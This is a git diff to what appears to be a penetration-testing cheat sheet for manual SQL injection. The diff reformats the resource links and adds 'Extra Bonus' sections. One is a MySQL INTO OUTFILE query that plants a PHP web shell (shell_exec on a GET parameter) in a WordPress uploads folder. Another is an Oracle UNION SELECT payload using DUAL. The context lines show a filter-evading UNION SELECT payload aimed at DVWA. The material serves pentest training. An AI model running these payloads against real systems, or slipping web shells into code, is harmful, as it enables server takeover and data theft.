@@ -9,8 +9,9 @@ tags:
 
 # SQLi Cheat sheet for manual injection
 
-- See a more detailed [explanation about SQL injection](webexploitation/sql-injection.md).
-- [Payloads for different SQL databases](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).
+!!! example "Resources"
+    - See a more detailed [explanation about SQL injection](webexploitation/sql-injection.md).
+    - [Payloads for different SQL databases](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).
 
 
 ### Boolean-based testing
@@ -285,3 +286,23 @@ More bypassing tips:
 1'+uNioN/**/sEleCt/**/table_name,2+fROm+information_schema.tables+where+table_schema?'dvwa'+limit+1,1%23&Submit=Submit#
 
 ```
+
+
+### Extra Bonus: Gaining a reverse shell from SQL injection
+
+Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.
+
+```mysql
+Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
+```
+
+### Extra Bonus: DUAL
+
+The DUAL is a special one row, one column table present by default in all Oracle databases. The owner of DUAL is SYS, but DUAL can be accessed by every user. This is a possible payload for SQLi:
+
+```
+'+UNION+SELECT+NULL+FROM+dual--
+```
+
+Oracle syntax requires the use of FROM, but some queries don't requires any table. For these case we use DUAL. Also Oracle doesn't allow the queries that employ information_schema.tables.
+
